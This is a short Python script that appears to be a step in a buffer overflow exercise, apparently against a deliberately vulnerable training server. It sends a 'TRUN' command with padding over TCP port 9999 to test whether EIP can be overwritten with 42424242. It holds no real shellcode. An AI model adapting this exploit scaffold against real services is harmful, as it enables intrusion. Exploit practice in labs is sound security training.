#!/usr/bin/python3
import sys
import socket

target_ip = ""
target_port = 9999
cmd_attacking = 'TRUN /.:/'
offset = 0
shellcode = "A" * offset + "B" * 4
print("-" * 100)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    payload = cmd_attacking + shellcode
    s.send(payload.encode())
    print(f"\nPayload sent with a offset of {offset} bytes."
          f" \nExpected EIP value should be 42424242.\n")
    s.close()
    print("-" * 100)
except:
    print("Error connecting to server")
    print("-" * 100)
    sys.exit()


